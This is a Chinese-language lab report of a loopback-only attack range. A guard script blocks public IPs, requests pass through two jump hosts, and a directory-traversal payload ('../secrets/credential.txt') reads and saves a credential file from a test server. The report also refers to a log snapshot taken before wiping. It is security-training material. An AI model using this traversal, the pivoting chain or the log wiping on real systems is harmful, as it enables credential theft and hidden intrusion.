## 1. 边界护栏（攻击前先拦）

脚本：`range/boundary_guard.py`，机器可判 exit code。

```
[PASS] 127.0.0.4:8080 PASS 回环地址
[PASS] 127.0.0.2:9001 PASS 回环地址
[PASS] 127.0.0.3:9002 PASS 回环地址
RESULT=ALLOW (3 个目标均在回环白名单)   exit=0
```

反向验证（护栏有效性）：

```
python3 boundary_guard.py 127.0.0.4:8080 1.2.4.8:80 8.8.8.8:53
[PASS] 127.0.0.4:8080 ...
[REJECT] 1.2.4.8:80 REJECT 公网 IP（含中国 IP 段）
[REJECT] 8.8.8.8:53 REJECT 公网 IP（含中国 IP 段）
RESULT=DENY   exit=2
```

结论：白名单只放 127.0.0.0/8；中国常见公网段 `1.x` 及任意公网 IP 均被拒，护栏 exit code 可判（ALLOW=0 / DENY=2）。

## 2. 靶场拓扑与真实跳板链

```
攻击者 127.0.0.1
   │  (1) GET /file?name=../secrets/credential.txt
   ▼
跳板1  127.0.0.2:9001  (jump_host.py, label=j1)
   │  (2) 转发 + 追加 X-Forwarded-For
   ▼
跳板2  127.0.0.3:9002  (jump_host.py, label=j2)
   │  (3) 转发 + 追加 X-Forwarded-For
   ▼
靶机   127.0.0.4:8080  (victim_server.py)  ←-- 目录穿越漏洞
```

**真实跳板 IP 地址（演练中实际监听/连接，全部回环）：**

| 角色 | IP:端口 | 作用 | 证据文件 |
|---|---|---|---|
| 攻击端 | 127.0.0.1:随机源端口 | 发起请求 | 各 access.log 的 src_ip |
| 跳板1 | 127.0.0.2:9001 | 一级中转 | `jump_j1_access.log` |
| 跳板2 | 127.0.0.3:9002 | 二级中转 | `jump_j2_access.log` |
| 靶机 | 127.0.0.4:8080 | 漏洞服务 | `victim_access.log` |

**应用层跳板链（`X-Forwarded-For`，逐跳追加，摘自擦除前快照）：**

```
victim:   attacker-127.0.0.1 -> 127.0.0.1 -> 127.0.0.1 -> 127.0.0.1
jump j2:  attacker-127.0.0.1 -> 127.0.0.1 -> 127.0.0.1
jump j1:  attacker-127.0.0.1 -> 127.0.0.1
```

### 关于网络层源 IP 全是 127.0.0.1 的说明（不遮掩）

三个日志里 `src_ip` 列都显示 `127.0.0.1`，**没有**出现 `127.0.0.2` / `127.0.0.3`。原因：这是单机回环网络栈——跳板进程用 `urllib` 主动连下一跳时，内核把出站源地址选为 `127.0.0.1`（回环默认源地址），不会用监听地址 `127.0.0.2` 当源。这是操作系统网络栈的真实行为，不是脚本 bug。

因此本次"跳板链"的真实性体现在**应用层 X-Forwarded-For**（每跳真实追加），而非网络层源 IP。要拿到网络层真实的逐跳源 IP，需多主机/容器网络（见优化建议报告）。

## 3. 攻击执行与凭证窃取

脚本：`range/attacker.py`

```
[2026-11-24T01:13:18] GET http://127.0.0.2:9001/file?name=../secrets/credential.txt
[*] entry(jump1)=127.0.0.2:9001
[*] payload=/file?name=../secrets/credential.txt
[*] http_status=200 bytes=169
[*] loot saved -> artifacts/loot_credential.txt
```

漏洞类型：**目录穿越（Directory Traversal, CWE-22）**。靶机 `/file?name=` 未过滤 `../`，允许读取 webroot 之外文件。
